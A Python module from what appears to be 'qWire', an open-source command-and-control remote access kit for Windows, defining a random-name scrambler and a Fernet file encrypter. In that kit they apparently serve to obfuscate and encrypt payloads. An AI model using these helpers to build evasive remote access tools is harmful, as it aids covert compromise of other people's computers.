#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.22
# -------------------------------------------------------------
import string
import random
from cryptography.fernet import Fernet
from core.logging.logging import LoggingUtilitys

class Scrambler:

    #Function will return a scrambled string with the len passed as parameter
    def scrambleVar(self,int_var_length):
        random_chars = string.ascii_letters                                                             #Get random letters
        scrambled_chars = (''.join(random.choice(random_chars) for i in range(1, int(int_var_length)))) #Join them
        return scrambled_chars                                                                          #Return scrambled var string

class Crypter:

    #Function generates and returns key
    def generate_key(self):
        key = Fernet.generate_key()     #generate key
        return key                      #Return value

    #Function will encrypt a file, return the encrypted data and the key
    def encrypt_file(self,input_file):
        self.key = self.generate_key()  #Get a key
        crypter_obj = Fernet(self.key)  #Create crypter object
        self.encrypted_data = crypter_obj.encrypt(
            LoggingUtilitys().retrieve_file_data(input_file).encode()   #Encrypt the file data read from the input file
        )
        return self.encrypted_data, self.key                            #Returnt the encrypted data and the encryption key


